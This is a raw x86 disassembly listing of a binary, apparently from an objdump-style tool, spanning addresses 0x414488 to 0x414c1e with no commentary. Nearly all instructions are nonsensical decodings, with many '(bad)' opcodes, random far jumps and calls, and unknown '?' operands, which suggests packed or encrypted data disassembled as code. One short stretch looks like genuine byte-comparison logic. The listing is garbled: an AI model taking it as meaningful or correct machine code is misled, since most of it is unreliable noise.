  414488:	add    eax,0x47f99dd5
  41448d:	add    al,BYTE PTR [ecx]
  41448f:	mov    edi,DWORD PTR [esi+0xb]
  414492:	(bad)  
  414493:	xlat   BYTE PTR ds:[ebx]
  414494:	out    dx,al
  414495:	pop    ss
  414496:	stos   BYTE PTR es:[edi],al
  414497:	add    BYTE PTR [ebx+0x5807574f],dh
  41449d:	jge    0x4144f6
  41449f:	mov    bl,0xe7
  4144a1:	mov    cl,0x2d
  4144a3:	repz mov ch,dl
  4144a6:	stos   DWORD PTR es:[edi],eax
  4144a7:	jl     0x4144b7
  4144a9:	cmp    eax,0xbc1b9c36
  4144ae:	pop    eax
  4144af:	mov    bp,0x51ee
  4144b3:	cli    
  4144b4:	adc    DWORD PTR [eax+0x72],0xffffffa3
  4144b8:	les    esp,FWORD PTR ds:0xbbf0c500
  4144be:	mov    ds,WORD PTR [eax-0x4f]
  4144c1:	retf   0x2ba4
  4144c4:	dec    esi
  4144c5:	inc    eax
  4144c6:	pop    ecx
  4144c7:	sbb    ecx,DWORD PTR [edi-0x3e]
  4144ca:	mov    esi,DWORD PTR [eax+0x5a]
  4144cd:	push   esi
  4144ce:	mov    esi,0x54446f8b
  4144d3:	mov    ebp,0x9d8ef4f7
  4144d8:	inc    eax
  4144d9:	or     edi,esp
  4144db:	dec    BYTE PTR ds:0x1efe6723
  4144e1:	aaa    
  4144e2:	ficom  WORD PTR [edi]
  4144e4:	cmp    DWORD PTR [ebx+0x1ae161d5],ebx
  4144ea:	mov    esp,0x4dc3d49a
  4144ef:	aad    0x8a
  4144f1:	mov    bh,BYTE PTR [ebx-0x13ca1284]
  4144f7:	xor    eax,0xdd72b4f1
  4144fc:	push   esi
  4144fd:	sbb    BYTE PTR [edx+0x9],ch
  414500:	ret    
  414501:	mov    dl,0xfd
  414503:	ror    ch,cl
  414505:	lods   al,BYTE PTR ds:[esi]
  414506:	adc    DWORD PTR [esi-0x15f76cfc],0xffffffce
  41450d:	lahf   
  41450e:	(bad)  
  41450f:	fst    DWORD PTR [eax]
  414511:	jno    0x414517
  414513:	sbb    ch,cl
  414515:	xchg   ebx,eax
  414516:	mov    esi,0x2a752422
  41451b:	add    BYTE PTR [esi+0x2e],ah
  41451e:	ins    DWORD PTR es:[edi],dx
  41451f:	(bad)  [edx+0x4a]
  414522:	xor    ebx,DWORD PTR [edi+0x117b71aa]
  414528:	push   ss
  414529:	adc    al,0x59
  41452b:	aam    0x84
  41452d:	sub    BYTE PTR [edx+0x34],bl
  414530:	repz push edx
  414532:	mov    ?,WORD PTR [edi-0x40a026e8]
  414538:	dec    edi
  414539:	sti    
  41453a:	leave  
  41453b:	push   ebx
  41453c:	loopne 0x414523
  41453e:	mov    al,ds:0xdf2b550a
  414543:	(bad)  
  414544:	jge    0x4145a3
  414546:	lods   eax,DWORD PTR ds:[esi]
  414547:	xor    eax,0x61d86594
  41454c:	aaa    
  41454d:	loope  0x414508
  41454f:	fst    QWORD PTR [eax]
  414551:	lods   al,BYTE PTR ds:[esi]
  414552:	jecxz  0x41450a
  414554:	sbb    BYTE PTR [ebp+0x71],al
  414557:	imul   esi,DWORD PTR [eax],0x5190ca9
  41455d:	jmp    0x662c0f46
  414562:	lds    esp,FWORD PTR [ecx]
  414564:	pop    ebp
  414565:	inc    ebp
  414566:	imul   eax,esi,0x6f
  414569:	xchg   edi,eax
  41456a:	inc    esi
  41456b:	sub    dh,dl
  41456d:	int3   
  41456e:	cmp    esp,DWORD PTR es:[eax]
  414571:	js     0x414592
  414573:	sub    cl,BYTE PTR [esi]
  414575:	enter  0xaf16,0x2d
  414579:	jnp    0x414597
  41457b:	int    0x24
  41457d:	sub    ebp,edi
  41457f:	push   esi
  414580:	inc    ebp
  414581:	in     al,dx
  414582:	lods   al,BYTE PTR ds:[esi]
  414583:	jno    0x41451a
  414585:	js     0x414520
  414587:	rcr    edx,cl
  414589:	sbb    eax,DWORD PTR [esi]
  41458b:	mov    ebx,0xb215f259
  414590:	xchg   edx,eax
  414591:	jbe    0x41458e
  414593:	sub    BYTE PTR [eax],dl
  414595:	push   esp
  414596:	retf   
  414597:	xor    BYTE PTR [ebx+0x33],dl
  41459a:	dec    esi
  41459b:	shl    eax,0x1
  41459e:	stos   BYTE PTR es:[edi],al
  41459f:	xor    al,0xce
  4145a1:	xchg   esp,eax
  4145a2:	xor    ecx,esp
  4145a4:	mov    esi,0xcb1ba74c
  4145a9:	sbb    al,0x57
  4145ab:	dec    edx
  4145ac:	dec    esp
  4145ad:	je     0x4145b7
  4145af:	inc    esp
  4145b0:	jns    0x4145e1
  4145b2:	out    dx,eax
  4145b3:	jmp    0x41457a
  4145b5:	mov    edx,0xb40ef86c
  4145ba:	std    
  4145bb:	inc    ecx
  4145bc:	cli    
  4145bd:	enter  0x34e4,0xf4
  4145c1:	outs   dx,BYTE PTR ds:[esi]
  4145c2:	and    BYTE PTR [edi-0x11],bh
  4145c5:	test   BYTE PTR [ebx],bl
  4145c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145c8:	mov    ch,0x27
  4145ca:	sub    eax,0x7306e65a
  4145cf:	mov    ebp,0x47da2239
  4145d4:	dec    esi
  4145d5:	push   ecx
  4145d6:	cdq    
  4145d7:	xor    ecx,DWORD PTR [edi+0x53]
  4145da:	mov    ds:0x81295e32,al
  4145df:	pop    edx
  4145e0:	mov    ebp,0x7f86e727
  4145e5:	inc    edi
  4145e6:	iret   
  4145e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145e8:	dec    esp
  4145e9:	mov    cl,0x18
  4145eb:	(bad)  
  4145ec:	cmp    BYTE PTR [esi-0x40],cl
  4145ef:	cs jno 0x4145b6
  4145f2:	and    al,0x96
  4145f4:	pop    ds
  4145f5:	xchg   DWORD PTR [edx+0x6440999d],esi
  4145fb:	pop    ds
  4145fc:	pushf  
  4145fd:	mov    ch,0xfe
  4145ff:	fst    DWORD PTR [esi+0x45]
  414602:	daa    
  414603:	enter  0xf8cf,0x88
  414607:	add    BYTE PTR [edi-0x7c],al
  41460a:	or     BYTE PTR [ebx-0x24cdec3f],dh
  414610:	xchg   bh,bh
  414612:	inc    esp
  414613:	jle    0x41467c
  414615:	std    
  414616:	cmp    eax,0x8eb351e
  41461b:	cs cld 
  41461d:	inc    BYTE PTR [ebp+0x44]
  414620:	jg     0x414684
  414622:	mov    ds:0xa0ebdd46,eax
  414627:	add    BYTE PTR [esi-0x4d89e8f7],dl
  41462d:	and    al,0xa9
  41462f:	cmp    edi,0x98dda3bd
  414635:	adc    cl,dh
  414637:	xchg   ebx,eax
  414638:	sahf   
  414639:	xchg   BYTE PTR [ebx-0x7724a93e],ah
  41463f:	outs   dx,DWORD PTR ds:[esi]
  414640:	sub    ecx,esp
  414642:	cmp    al,0xce
  414644:	xor    esi,DWORD PTR [ecx-0x509ac30a]
  41464a:	adc    ebp,DWORD PTR [edi+0x523f5e1e]
  414650:	xchg   edx,eax
  414651:	stos   DWORD PTR es:[edi],eax
  414652:	push   cs
  414653:	ja     0x41465d
  414655:	cwde   
  414656:	js     0x4145de
  414658:	fdivr  DWORD PTR [ecx-0x5c6cc7e3]
  41465e:	mov    BYTE PTR [edi+0x59],dl
  414661:	cs repnz mov edi,0x4c83020c
  414668:	imul   edx,ecx,0xec766cff
  41466e:	sub    bl,BYTE PTR [ebp+0x2c3734d5]
  414674:	sbb    ch,BYTE PTR [ecx+0x3e]
  414677:	in     al,0x3f
  414679:	inc    ebp
  41467a:	lods   eax,DWORD PTR ds:[esi]
  41467b:	(bad)  [ebp-0x1c]
  41467e:	pop    esi
  41467f:	daa    
  414680:	js     0x41464b
  414682:	mov    bl,0xbd
  414684:	out    dx,eax
  414685:	inc    ebx
  414686:	cdq    
  414687:	(bad)  
  414688:	pop    ecx
  414689:	hlt    
  41468a:	cmp    al,0x4f
  41468c:	shr    al,1
  41468e:	jg     0x4146d2
  414690:	push   eax
  414691:	adc    eax,0x2c5b4257
  414696:	dec    ebp
  414697:	dec    ecx
  414698:	sub    DWORD PTR [ebp+0x78],ecx
  41469b:	push   ds
  41469c:	pop    ds
  41469d:	pop    eax
  41469e:	div    BYTE PTR [eax-0x2e1f7a19]
  4146a4:	cmp    al,0x15
  4146a6:	push   ecx
  4146a7:	nop
  4146a8:	cli    
  4146a9:	mov    esp,0xab4dc34b
  4146ae:	jo     0x414725
  4146b0:	je     0x41463b
  4146b2:	or     ah,BYTE PTR ds:[ebx+0x3b704359]
  4146b9:	or     DWORD PTR [eax],ecx
  4146bb:	es aas 
  4146bd:	pusha  
  4146be:	xor    DWORD PTR [edx],ebp
  4146c0:	out    dx,eax
  4146c1:	jae    0x414660
  4146c3:	cmp    ah,al
  4146c5:	(bad)  
  4146c7:	ins    BYTE PTR es:[edi],dx
  4146c8:	or     cl,bl
  4146ca:	fs je  0x414744
  4146cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146ce:	mov    esp,0xe018899f
  4146d3:	ja     0x4146d3
  4146d5:	adc    eax,0xd3a682f9
  4146da:	xchg   ebp,eax
  4146db:	push   esp
  4146dc:	ins    DWORD PTR es:[edi],dx
  4146dd:	cmp    ebx,DWORD PTR [edi]
  4146df:	adc    ch,BYTE PTR [edi-0x7ec23751]
  4146e5:	bound  esi,QWORD PTR [eax]
  4146e7:	lods   al,BYTE PTR ds:[esi]
  4146e8:	jge    0x4146f7
  4146ea:	cmp    ebx,DWORD PTR [edi+0x18]
  4146ed:	stos   BYTE PTR es:[edi],al
  4146ee:	fisub  WORD PTR [ebx-0x257c13b]
  4146f4:	loope  0x41467e
  4146f6:	dec    esp
  4146f7:	dec    edi
  4146f8:	inc    eax
  4146f9:	sti    
  4146fa:	pop    edx
  4146fb:	xchg   ecx,eax
  4146fc:	mov    al,ds:0xa114bf73
  414701:	sub    eax,0x283dbace
  414706:	add    BYTE PTR [edi],ah
  414708:	mov    ch,0x30
  41470a:	push   ss
  41470b:	out    dx,eax
  41470c:	outs   dx,BYTE PTR ds:[esi]
  41470d:	mov    ah,0x47
  41470f:	or     dl,al
  414711:	jnp    0x41470e
  414713:	mov    ds:0x565b13ab,al
  414718:	fucom  st(4)
  41471a:	in     eax,0x9
  41471c:	lods   al,BYTE PTR ds:[esi]
  41471d:	ss push ebx
  41471f:	push   0x35
  414721:	test   al,0xc8
  414723:	fdiv   QWORD PTR [ecx-0x37]
  414726:	push   0xedd0f8f2
  41472b:	dec    ecx
  41472c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41472d:	sub    eax,0xd0801f4c
  414732:	sub    ebp,DWORD PTR [esi+0x4]
  414735:	push   0xffffffdb
  414737:	outs   dx,BYTE PTR ds:[esi]
  414738:	sub    bh,BYTE PTR ds:[ecx-0x14d8d202]
  41473f:	iret   
  414740:	xchg   ecx,eax
  414741:	lea    ebx,[esp+esi*8-0x3e72114f]
  414748:	jne    0x4147c8
  41474a:	mov    esp,0xd0e5044a
  41474f:	sub    esi,esi
  414751:	xor    edx,DWORD PTR [ecx]
  414753:	(bad)  
  414754:	ret    
  414755:	inc    edi
  414756:	imul   edx,edi,0x588c26fe
  41475c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41475d:	aam    0x1b
  41475f:	sub    BYTE PTR [edx],ah
  414761:	neg    bh
  414763:	sub    al,0x3f
  414765:	jmp    0x41478f
  414767:	int3   
  414768:	sub    al,0x32
  41476a:	mov    bl,0x42
  41476c:	pop    eax
  41476d:	inc    ebp
  41476e:	pusha  
  41476f:	inc    esi
  414770:	cmc    
  414771:	enter  0x6688,0x21
  414775:	add    esi,DWORD PTR [eax]
  414777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414778:	mov    ah,0xe9
  41477a:	sub    bl,bh
  41477c:	sbb    al,0xc3
  41477e:	inc    ebp
  41477f:	mov    ebp,0xa68dfab9
  414784:	jae    0x414804
  414786:	repnz sbb esi,DWORD PTR [eax-0x7431eb20]
  41478d:	and    BYTE PTR [esi-0x3e],dh
  414790:	adc    eax,0xfb6e7f00
  414795:	icebp  
  414796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414797:	ret    0xed26
  41479a:	shr    BYTE PTR [eax-0x3],0xc3
  41479e:	lods   eax,DWORD PTR ds:[esi]
  41479f:	mov    cl,0x2a
  4147a1:	in     eax,0xd0
  4147a3:	jns    0x4147d6
  4147a5:	and    eax,0x38
  4147a8:	push   ebp
  4147a9:	pop    eax
  4147aa:	(bad)  
  4147ab:	mov    cl,0xea
  4147ad:	aaa    
  4147ae:	or     al,BYTE PTR [ebp-0x60]
  4147b1:	or     bh,BYTE PTR [ebx-0xf]
  4147b4:	cmp    DWORD PTR [edx+esi*1-0x9],eax
  4147b8:	cld    
  4147b9:	push   ebx
  4147ba:	xor    al,0x1b
  4147bc:	fild   WORD PTR [ecx]
  4147be:	sbb    DWORD PTR [ebp+0x5f30f3fc],ebx
  4147c4:	js     0x41478b
  4147c6:	outs   dx,BYTE PTR ds:[esi]
  4147c7:	jnp    0x414813
  4147c9:	adc    al,0xe2
  4147cc:	add    BYTE PTR [edi-0xe4343a6],0x46
  4147d3:	xchg   edx,ebp
  4147d5:	jb     0x414849
  4147d7:	(bad)  
  4147d8:	jne    0x4147ea
  4147da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147db:	clc    
  4147dc:	test   eax,0xd612acbe
  4147e1:	popa   
  4147e2:	(bad)
  4147e6:	test   DWORD PTR [ecx],edx
  4147e8:	repz jmp 0xa89f:0x98657c2d
  4147f0:	lods   al,BYTE PTR ds:[esi]
  4147f1:	dec    edi
  4147f2:	call   0xfd9e748d
  4147f7:	dec    ebx
  4147f8:	lods   eax,DWORD PTR ds:[esi]
  4147f9:	aaa    
  4147fa:	dec    esi
  4147fb:	jae    0x4147c8
  4147fd:	enter  0x58ea,0x9e
  414801:	or     BYTE PTR [eax-0x6c],0x4d
  414805:	call   0xdcd4:0xbb429340
  41480c:	(bad)
  41480f:	mov    bl,0x9b
  414811:	and    al,BYTE PTR [edx+0x38]
  414814:	push   eax
  414815:	out    0x54,eax
  414817:	leave  
  414818:	add    al,0x84
  41481a:	and    al,0x57
  41481c:	retf   0x75f4
  41481f:	xchg   BYTE PTR [edx-0x36],bh
  414822:	stos   DWORD PTR es:[edi],eax
  414823:	iret   
  414824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414825:	(bad)  
  414826:	popa   
  414827:	stc    
  414828:	mov    eax,0x7f18e086
  41482d:	inc    ebp
  41482e:	repnz inc esp
  414830:	xor    ch,BYTE PTR [eax+0x2f]
  414833:	mov    al,0x76
  414835:	xor    edi,DWORD PTR [edx]
  414837:	std    
  414838:	jo     0x41489d
  41483a:	jnp    0x4148a8
  41483c:	mov    dl,dh
  41483e:	xchg   ecx,eax
  41483f:	mov    WORD PTR [ebp+0x4ffc9660],?
  414845:	dec    esp
  414846:	mov    eax,0xe7db4be6
  41484b:	stos   BYTE PTR es:[edi],al
  41484c:	ins    BYTE PTR es:[edi],dx
  41484d:	jo     0x4147da
  41484f:	or     DWORD PTR [edi+0x6f],esi
  414852:	cli    
  414853:	mov    cl,0x22
  414855:	xor    al,0xe
  414857:	push   ds
  414858:	dec    ecx
  414859:	xchg   ecx,eax
  41485a:	adc    eax,0x134164e2
  41485f:	xor    dh,0x14
  414862:	mov    esi,DWORD PTR [ebx+0x6d]
  414865:	inc    ecx
  414866:	leave  
  414867:	leave  
  414868:	mov    al,0x75
  41486a:	push   edi
  41486b:	cmp    al,0x89
  41486d:	ins    DWORD PTR es:[edi],dx
  41486e:	repz or DWORD PTR [ebx+edx*8-0xe],esi
  414873:	adc    DWORD PTR [ecx],edx
  414875:	jnp    0x4148e7
  414877:	call   0x26ed:0x2b4ab43e
  41487e:	and    al,0xde
  414880:	sub    BYTE PTR [ebx-0x50c206fd],cl
  414886:	mov    ebp,0xbc998bef
  41488b:	or     esp,edi
  41488d:	cdq    
  41488e:	(bad)
  414893:	mov    dh,0x7f
  414895:	dec    eax
  414896:	add    ch,ch
  414898:	cwde   
  414899:	jecxz  0x414895
  41489b:	scas   eax,DWORD PTR es:[edi]
  41489c:	jnp    0x414820
  41489e:	push   edi
  41489f:	popf   
  4148a0:	sbb    esi,DWORD PTR [ecx+0x3d1993b2]
  4148a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148a7:	sbb    dh,BYTE PTR [ecx]
  4148a9:	jg     0x414875
  4148ab:	mov    esi,DWORD PTR [ecx]
  4148ad:	(bad)  
  4148ae:	push   ss
  4148af:	and    DWORD PTR [eax+0x33e77e8c],ebx
  4148b5:	jnp    0x4148c4
  4148b7:	and    dl,BYTE PTR ss:[ebx+0x3bee6ec6]
  4148be:	rcr    DWORD PTR [edx+0x5243cec4],0xb2
  4148c5:	mov    edi,DWORD PTR [edi-0x5d944e14]
  4148cb:	sbb    eax,0xc97fec77
  4148d0:	mov    bl,0x86
  4148d2:	std    
  4148d3:	adc    ch,al
  4148d5:	xchg   ebx,eax
  4148d6:	out    dx,eax
  4148d7:	mov    al,0x87
  4148d9:	add    ah,BYTE PTR [esi+0x17]
  4148dc:	push   esi
  4148dd:	mov    DWORD PTR [edi-0x33],esi
  4148e0:	(bad)  
  4148e1:	fld    DWORD PTR [edi-0x56]
  4148e4:	jnp    0x414956
  4148e6:	out    dx,eax
  4148e7:	adc    ch,dl
  4148e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148ea:	dec    esi
  4148eb:	mov    edx,0x4b372fc5
  4148f0:	sar    BYTE PTR [ebx-0x317225b4],0x7
  4148f7:	and    DWORD PTR [ebp-0x21c20ade],ebp
  4148fd:	xchg   DWORD PTR [esi-0x65ffb3e7],ecx
  414903:	std    
  414904:	mov    ds:0x16fc19be,eax
  414909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41490a:	icebp  
  41490b:	iret   
  41490c:	aad    0xc7
  41490e:	cmp    al,0x81
  414910:	mov    edx,DWORD PTR [ebp-0xc]
  414913:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41491a:	mov    bl,BYTE PTR [ebp-0x1]
  41491d:	cmp    dl,bl
  41491f:	je     0x416d50
  414925:	mov    ecx,DWORD PTR [ebp-0x5c]
  414928:	mov    edx,DWORD PTR [ebp-0xc]
  41492b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  414932:	mov    ebx,DWORD PTR [ebp+0xc]
  414935:	xor    ecx,eax
  414937:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272fa]
  41493e:	jne    0x416e84
  414944:	mov    ecx,DWORD PTR [ebp-0x5c]
  414947:	mov    edx,DWORD PTR [ebp+0xc]
  41494a:	xor    ecx,eax
  41494c:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fa]
  414954:	mov    edx,DWORD PTR [ebp-0x18]
  414957:	xor    edx,eax
  414959:	add    edx,esi
  41495b:	cmp    ecx,edx
  41495d:	mov    ecx,DWORD PTR [ebp-0x14]
  414960:	mov    DWORD PTR [ebp+0x8],ecx
  414963:	mov    ecx,DWORD PTR [ebp+0x8]
  414966:	je     0x416f8c
  41496c:	xor    ecx,eax
  41496e:	add    ecx,esi
  414970:	mov    ecx,0xf641bea
  414975:	je     0x416dd8
  41497b:	mov    edx,DWORD PTR [ebp+0x8]
  41497e:	jmp    0x416cd1
  414983:	outs   dx,DWORD PTR ds:[esi]
  414984:	sub    edi,DWORD PTR [ebx]
  414986:	xchg   BYTE PTR [edi],bh
  414988:	div    BYTE PTR [esi+0x72]
  41498b:	daa    
  41498c:	mov    dl,0xdf
  41498e:	mov    ah,BYTE PTR [edi]
  414990:	xlat   BYTE PTR ds:[ebx]
  414991:	xlat   BYTE PTR ds:[ebx]
  414992:	lahf   
  414993:	dec    esi
  414994:	xchg   esp,eax
  414995:	jp     0x414a12
  414997:	mov    cl,0x9c
  414999:	jnp    0x414a16
  41499b:	aaa    
  41499c:	fld    DWORD PTR [eax]
  41499e:	cmp    al,bh
  4149a0:	std    
  4149a1:	or     ah,BYTE PTR [ecx]
  4149a3:	sahf   
  4149a4:	ja     0x414956
  4149a6:	nop
  4149a7:	in     eax,0xa1
  4149a9:	and    eax,0xef1cec44
  4149ae:	sbb    edx,DWORD PTR [edx]
  4149b0:	ds and eax,0x228516b0
  4149b6:	and    DWORD PTR [ebx-0x17],eax
  4149b9:	dec    esi
  4149ba:	push   edx
  4149bb:	fsub   QWORD PTR [esi+0x6fd43acf]
  4149c1:	call   0x236:0x1943d9c2
  4149c8:	fist   DWORD PTR [edi]
  4149ca:	or     esi,DWORD PTR [eax]
  4149cc:	loope  0x414a41
  4149ce:	daa    
  4149cf:	inc    edx
  4149d0:	fs std 
  4149d2:	jmp    0x7925047e
  4149d7:	adc    eax,0x6a54a462
  4149dc:	push   es
  4149dd:	mov    edx,0x8a7ecb50
  4149e2:	fild   QWORD PTR [edi-0x4f]
  4149e5:	xor    DWORD PTR [eax+0x2b],esp
  4149e8:	jl     0x4149fd
  4149ea:	mov    esp,0xbce588b
  4149ef:	sub    al,0x9
  4149f1:	dec    edi
  4149f2:	add    bh,BYTE PTR [ebp-0x5f380239]
  4149f8:	inc    ecx
  4149f9:	(bad)  
  4149fa:	(bad)  
  4149fb:	push   edx
  4149fc:	push   0x62791036
  414a01:	pop    ebx
  414a02:	cwde   
  414a03:	addr16 add eax,0xf7ba0a6
  414a09:	pushf  
  414a0a:	das    
  414a0b:	cs mov al,0xb4
  414a0e:	mov    dh,ch
  414a10:	xor    bh,BYTE PTR [ecx+edi*4-0x751e5a77]
  414a17:	ror    DWORD PTR [edx+0x72621199],1
  414a1d:	pop    eax
  414a1e:	fs lock cli 
  414a21:	mov    edi,0x6d242d7c
  414a26:	fidiv  WORD PTR [eax]
  414a28:	dec    esp
  414a29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a2a:	popf   
  414a2b:	jne    0x4149ce
  414a2d:	sub    esp,edx
  414a2f:	push   ecx
  414a30:	xor    BYTE PTR [esp+ebp*8-0x36],0x19
  414a35:	test   al,0xda
  414a38:	xor    eax,0x1d3f73bc
  414a3d:	inc    esi
  414a3e:	xor    esi,edx
  414a40:	fistp  WORD PTR [edx]
  414a42:	movq   mm2,QWORD PTR ds:0x92215064
  414a49:	jae    0x4149e7
  414a4b:	in     al,0xbc
  414a4d:	add    BYTE PTR [esi+edx*2],bl
  414a50:	pop    es
  414a51:	mov    ds:0x291bfd34,eax
  414a56:	fcomp  QWORD PTR [eax]
  414a58:	les    eax,FWORD PTR [ebp+0x27a981e5]
  414a5e:	sub    al,0xc6
  414a60:	lahf   
  414a61:	xchg   edi,eax
  414a62:	aas    
  414a63:	arpl   di,di
  414a65:	or     esp,DWORD PTR [esi-0x1e]
  414a68:	cwde   
  414a69:	ins    BYTE PTR es:[edi],dx
  414a6a:	pop    ds
  414a6b:	add    bl,BYTE PTR [edi+0x62c7aab5]
  414a71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a72:	adc    ah,BYTE PTR [ebx-0x20409dde]
  414a78:	clc    
  414a79:	cdq    
  414a7a:	cmp    dh,BYTE PTR [esi]
  414a7c:	sub    bl,BYTE PTR [ebx-0x7ccb16e1]
  414a82:	cs sti 
  414a84:	sbb    cl,BYTE PTR [ebp-0x3f]
  414a87:	in     al,0xa4
  414a89:	fstp   TBYTE PTR [esi]
  414a8b:	or     BYTE PTR [ebp-0x52],0x48
  414a8f:	jns    0x414b00
  414a91:	out    0xfe,eax
  414a93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a95:	pop    ebx
  414a96:	xor    ah,BYTE PTR [ebx-0x9b4f281]
  414a9c:	addr16 pop esp
  414a9e:	mov    eax,ds:0xc93abbca
  414aa3:	and    eax,0x53fdffb5
  414aa8:	or     dh,dh
  414aaa:	fsub   QWORD PTR [ecx]
  414aac:	int3   
  414aad:	not    DWORD PTR [esi-0x54a482e4]
  414ab3:	xor    al,0x17
  414ab5:	es ins DWORD PTR es:[edi],dx
  414ab7:	push   ds
  414ab8:	and    eax,0xbf3ffd3f
  414abd:	inc    edx
  414abe:	push   es
  414abf:	sbb    DWORD PTR [esi-0x14b8f1a0],ebx
  414ac5:	jnp    0x414a8d
  414ac7:	or     al,ch
  414ac9:	ret    0xca2
  414acc:	jb     0x414af0
  414ace:	data16 jns 0x414a58
  414ad1:	leave  
  414ad2:	and    cl,BYTE PTR [edi-0x38]
  414ad5:	shl    ah,cl
  414ad7:	xor    eax,DWORD PTR [eax]
  414ad9:	in     eax,0x72
  414adb:	mov    bl,0x17
  414add:	shl    DWORD PTR [ebx],1
  414adf:	imul   esp,ebx,0x3
  414ae2:	add    ebp,DWORD PTR [ebx+0x7b3b1e80]
  414ae8:	mov    WORD PTR [edx+0x4218aaeb],ss
  414aee:	xchg   DWORD PTR [edi+0x3c9a53ab],ebx
  414af4:	xchg   ebp,eax
  414af5:	jae    0x414b14
  414af7:	rcr    BYTE PTR [ecx-0x69087167],0x17
  414afe:	inc    ecx
  414aff:	neg    BYTE PTR [esi+edx*8+0x68]
  414b03:	fnstsw WORD PTR [edi]
  414b05:	xor    esi,edi
  414b07:	clc    
  414b08:	aaa    
  414b09:	(bad)  
  414b0a:	sub    al,0x71
  414b0c:	xchg   esp,eax
  414b0d:	(bad)  
  414b0e:	sbb    BYTE PTR [ecx],al
  414b10:	mov    ecx,0x1f391fb5
  414b15:	sbb    al,dh
  414b17:	imul   esi,DWORD PTR [esp+esi*8-0x637a0ddb],0x60e7208b
  414b22:	pop    edx
  414b23:	add    ecx,edi
  414b25:	ins    BYTE PTR es:[edi],dx
  414b26:	es inc esi
  414b28:	jmp    0x414b3a
  414b2a:	push   eax
  414b2b:	mov    eax,ds:0x64dc4bbc
  414b30:	and    edx,DWORD PTR [eax+edx*4+0x1fe5c9fd]
  414b37:	mov    edx,0x7d472f84
  414b3c:	pusha  
  414b3d:	lods   eax,DWORD PTR ds:[esi]
  414b3e:	cdq    
  414b3f:	jl     0x414b09
  414b41:	mov    WORD PTR [esi],?
  414b43:	sar    BYTE PTR [esi+0x5b0f8339],cl
  414b49:	js     0x414b4c
  414b4b:	adc    al,0xf1
  414b4d:	xor    ch,BYTE PTR [ebx-0x4]
  414b50:	sub    edi,edx
  414b52:	or     BYTE PTR [ecx-0x741cd226],al
  414b58:	ja     0x414bb9
  414b5a:	cmp    eax,0x3154ad37
  414b5f:	stos   BYTE PTR es:[edi],al
  414b60:	lds    eax,FWORD PTR [ebp+0x2f09eaf9]
  414b66:	lahf   
  414b67:	mov    bl,0x4a
  414b69:	shl    bl,1
  414b6b:	cmp    eax,DWORD PTR [ebp-0xd]
  414b6e:	pop    eax
  414b6f:	xchg   edi,eax
  414b70:	jge    0x414be2
  414b72:	(bad)  
  414b73:	shr    edi,cl
  414b75:	outs   dx,DWORD PTR ds:[esi]
  414b76:	jmp    0x414b0e
  414b78:	scas   eax,DWORD PTR es:[edi]
  414b79:	xchg   ebx,eax
  414b7a:	xchg   ah,dh
  414b7c:	xor    al,BYTE PTR [eax-0x4fa6cea]
  414b82:	loop   0x414bb7
  414b84:	iret   
  414b85:	push   esp
  414b86:	dec    eax
  414b87:	sbb    al,0x31
  414b89:	dec    ebx
  414b8a:	push   edx
  414b8b:	mov    ebp,0x85c5c915
  414b90:	aad    0x3e
  414b92:	mov    al,0x41
  414b94:	es retf 0x8096
  414b98:	sub    al,0xc
  414b9a:	cdq    
  414b9b:	push   ds
  414b9c:	leave  
  414b9d:	jns    0x414b68
  414b9f:	(bad)  
  414ba1:	inc    ecx
  414ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ba3:	sub    dh,ah
  414ba5:	pusha  
  414ba6:	add    BYTE PTR [edi],ch
  414ba8:	cli    
  414ba9:	es (bad) 
  414bab:	fsub   QWORD PTR [eax-0x67]
  414bae:	cmp    bh,BYTE PTR [edi+0x6ac8c3c7]
  414bb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bb5:	cmp    DWORD PTR [ecx+0x61],eax
  414bb8:	xchg   esp,eax
  414bb9:	pop    ds
  414bba:	jmp    0x414c0e
  414bbc:	cmp    bl,BYTE PTR [ebx-0x557567ac]
  414bc2:	cwde   
  414bc3:	cmp    DWORD PTR [ebp+0x11],ebp
  414bc6:	dec    ebp
  414bc7:	dec    edi
  414bc8:	lock imul esp,esi,0x704ac4f0
  414bcf:	es cmp esi,esi
  414bd2:	test   DWORD PTR [edx-0x4a],edx
  414bd5:	sbb    esi,esi
  414bd7:	jne    0x414c08
  414bd9:	test   DWORD PTR [ebx-0x26c51f1f],edx
  414bdf:	stos   BYTE PTR es:[edi],al
  414be0:	fldcw  WORD PTR [ebx]
  414be2:	jmp    0x55c9:0x3bde463d
  414be9:	aam    0x7a
  414beb:	fstp   QWORD PTR [edx+edx*8-0x64]
  414bef:	mov    eax,DWORD PTR [eax+0x42e62f50]
  414bf5:	mov    al,ds:0x5e12be0b
  414bfa:	retf   
  414bfb:	jne    0x414ba8
  414bfd:	stc    
  414bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bff:	bound  eax,QWORD PTR [ebx+esi*8-0x1616a5ab]
  414c06:	idiv   dl
  414c08:	cmp    BYTE PTR [ecx-0x6d],ah
  414c0b:	jp     0x414bee
  414c0d:	ret    
  414c0e:	leave  
  414c0f:	xor    edi,esi
  414c11:	mov    fs,WORD PTR ds:0x8170005d
  414c17:	(bad)  
  414c18:	sbb    al,0x78
  414c1a:	scas   eax,DWORD PTR es:[edi]
  414c1b:	int3   
  414c1c:	ss ins BYTE PTR es:[edi],dx
  414c1e:	retf   0x3b68
